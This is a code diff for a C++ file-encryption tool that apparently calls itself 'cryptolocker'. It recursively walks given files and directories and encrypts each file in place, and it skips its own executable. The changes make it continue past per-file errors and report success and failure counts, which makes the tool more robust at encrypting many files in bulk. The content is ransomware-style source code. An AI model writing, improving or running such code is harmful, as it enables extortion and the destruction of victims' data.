@@ -69,10 +69,10 @@ static int // Return 0 on success
 process_one_file(std::filesystem::path path, std::uintmax_t length, const uint64_t key[4])
 {
   if (path.string().find("cryptolocker") != std::string::npos) { // Do not encrypt itself
-    std::cerr << "Skipping " << path << "\n";
+    std::cout << "Skipping " << path << "\n";
   	return 0;
   }
-  std::cerr << "Processing " << path << "\n";
+  std::cout << "Processing " << path << "\n";
   std::fstream f(path, std::fstream::in | std::fstream::out | std::fstream::binary);
   if (!f.is_open()) {
     std::cerr << "Cannot open " << path << "\n";
@@ -211,18 +211,28 @@ int main(int argc, char** argv)
   }
 
   // Iterate over the given files or folders (can be more than one)
+  unsigned ok_ct = 0, fail_ct = 0;
   for (int i = start_with; i < argc; i++) {
     auto p = std::filesystem::path(argv[i]);
   	auto s = std::filesystem::status(p);
     if (std::filesystem::is_regular_file(s)) {
-      if (process_one_file(p, std::filesystem::file_size(p), k)) return 1;
+      if (process_one_file(p, std::filesystem::file_size(p), k)) {
+      	fail_ct++;
+      } else {
+        ok_ct++;
+      }
     } else if (std::filesystem::is_directory(s)) {
       for (auto& q: std::filesystem::recursive_directory_iterator(argv[i])) {
       	if (q.is_regular_file()) {
-          if (process_one_file(q.path(), q.file_size(), k)) return 1;
+          if (process_one_file(q.path(), q.file_size(), k)) {
+          	fail_ct++;
+          } else {
+          	ok_ct++;
+          }
         }
       }
     }
   }
+  std::cerr << ok_ct << " files(s), " << fail_ct << " errors\n";
   return 0;
 }
